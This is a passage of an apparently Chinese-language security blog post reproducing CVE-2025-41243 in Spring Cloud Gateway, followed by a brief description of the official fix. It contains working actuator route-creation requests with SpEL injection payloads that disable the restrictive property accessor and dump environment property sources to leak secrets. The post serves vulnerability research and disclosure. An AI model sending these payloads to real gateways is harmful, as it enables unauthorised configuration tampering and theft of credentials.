&quot;#&#123;@systemProperties[&#x27;spring.cloud.gateway.restrictive-property-accessor.enabled&#x27;]=false&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://xxxx.xxx:9999&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925162746-dpvymd4.png" alt="image-20250925162746-dpvymd4"></p>
<p>直接关闭安全模式</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925165205-kx89nwe.png" alt="image-20250925165205-kx89nwe"></p>
<p>直接读<code>@environment.propertySources</code>​</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test1 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8889</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>368</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test1&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;#&#123; @environment.propertySources.toString&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://xxxx.xxx:9999&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功读取敏感信息</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925170643-gupqz37.png" alt="image-20250925170643-gupqz37"></p>
<p>‍</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方多写了一条检测机制 -&gt; <code>withAssignmentDisabled</code> -&gt; 禁止赋值操作</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250924192430-bgbtss3.png" alt="image-20250924192430-bgbtss3"></p>
<p>若继续进行赋值操作，则会报错 -&gt; <code>org.springframework.expression.spel.SpelEvaluationException: EL1068E: The expression component &#39;@systemProperties[&#39;user.language&#39;]=&#39;cn&#39;&#39; is not assignable</code>​</p>
<p>‍</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/08/28/db2%20JNDI%20&&%20%E9%AB%98%E7%89%88%E6%9C%ACJDK%20Bypass%20&&%20AspectJWeaver%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%20&&%20Dataease%E6%9C%80%E6%96%B0RCE%E5%A4%8D%E7%8E%B0/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2025-09-25 17:25:59
            </span>
            
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-41243-Spring-Cloud-Gateway-%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E"><span class="toc-text">CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-text">Java SpEL表达式注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%89%8D%E8%BA%AB-CVE-2022-2947-Spring-Cloud-Gateway-SpEL-RCE"><span class="toc-text">漏洞前身 -&gt; CVE-2022-2947 Spring Cloud Gateway SpEL RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-41243-Spring-Cloud-Gateway-%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-1"><span class="toc-text">CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
    <div class="footer-views">
      
      
          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        
      
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        


        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CVE-2025-41243%20Spring%20Cloud%20Gateway%20%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2025%2F09%2F25%2FCVE-2025-41243%2520Spring%2520Cloud%2520Gateway%2520%25E7%258E%25AF%25E5%25A2%2583%25E5%25B1%259E%25E6%2580%25A7%25E4%25BF%25AE%25E6%2594%25B9%25E6%25BC%258F%25E6%25B4%259E%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2025/09/25/CVE-2025-41243%20Spring%20Cloud%20Gateway%20%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
